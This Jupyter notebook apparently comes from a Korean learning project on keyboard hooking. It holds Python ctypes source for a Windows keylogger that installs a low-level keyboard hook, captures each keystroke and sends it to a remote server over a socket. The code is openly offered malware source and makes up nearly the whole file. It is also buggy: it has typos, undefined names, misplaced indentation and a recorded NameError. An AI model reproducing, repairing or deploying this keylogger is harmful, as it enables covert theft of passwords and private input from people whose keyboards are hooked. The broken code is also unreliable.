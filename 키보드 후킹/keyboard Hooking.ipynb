{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import socket\n",
    "from ctypes import *\n",
    "from ctypes.wintypes import MSG\n",
    "from ctypes.wintypes import DWORD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "user32 = windll.user32\n",
    "kernel32 = windll.kernel32"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'Keylogger' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-10-7d409dea5a58>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;32mclass\u001b[0m \u001b[0mKeylogger\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      2\u001b[0m     \u001b[1;32mdef\u001b[0m \u001b[0m__init__\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mself\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      3\u001b[0m         \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0miu32\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0muser32\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      4\u001b[0m         \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mhooked\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;32mNone\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      5\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m<ipython-input-10-7d409dea5a58>\u001b[0m in \u001b[0;36mKeylogger\u001b[1;34m()\u001b[0m\n\u001b[0;32m     45\u001b[0m         \u001b[0muser32\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mGetMessageA\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mbyref\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mmsg\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     46\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 47\u001b[1;33m     \u001b[0mkeyLogger\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mKeylogger\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     48\u001b[0m     \u001b[0mpointer\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mgetFPTR\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mhookProc\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     49\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mkeylogger\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0minstallHookProc\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mpointer\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mNameError\u001b[0m: name 'Keylogger' is not defined"
     ]
    }
   ],
   "source": [
    "class Keylogger:\n",
    "    def __init__(self):\n",
    "        self.iu32 = user32\n",
    "        self.hooked=None\n",
    "        \n",
    "    def installHookProc(self, pointer):\n",
    "        self.hooked = self.iu32.SetWindowsHookExA(\n",
    "        WH_KEYBOARD_LL,\n",
    "            pointer,\n",
    "            kernel32.GetModuleHandleW(None),\n",
    "            0\n",
    "        )\n",
    "        if not self.hooked:\n",
    "            return False\n",
    "        return True\n",
    "    \n",
    "    def uninstallHookProc(self):\n",
    "        if self.hooked is None:\n",
    "            retuen\n",
    "        self.iu32.UnhookWindowsHookEx(self.hooked)\n",
    "        self.hooked=None\n",
    "        \n",
    "    def getFPTR(fn):\n",
    "        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))\n",
    "        return CMPFUNC(fn)\n",
    "    \n",
    "    def hookProc(nCode, wParam, lParam):\n",
    "        if wParam is not WM_KEYDOWM:\n",
    "            return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)\n",
    "        \n",
    "        hookedKey = chr(lparam[0])\n",
    "        sys.stdout.write(hookedKey)\n",
    "        conn = connectServer()\n",
    "        sendString(conn, hookedKey)\n",
    "        conn.close()\n",
    "        \n",
    "        if (CTRL_CODE == int(lParam[0])):\n",
    "            print(\"unset!\")\n",
    "            keyLogger.uninstallHookProc()\n",
    "            sys.exit(-1)\n",
    "        return user32.CallNextHookEx(keyLogger.hooked, nCode, wparam, lparam)\n",
    "    \n",
    "    def startKeyLog():\n",
    "        msg = MSG()\n",
    "        user32.GetMessageA(byref(msg),0,0,0)\n",
    "        \n",
    "    keyLogger = Keylogger()\n",
    "    pointer = getFPTR(hookProc)\n",
    "    if keylogger.installHookProc(pointer):\n",
    "        print(\"keylogger has been started prasdess 'ctrl' to unset the keylogger\")\n",
    "        \n",
    "    startKeyLog()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
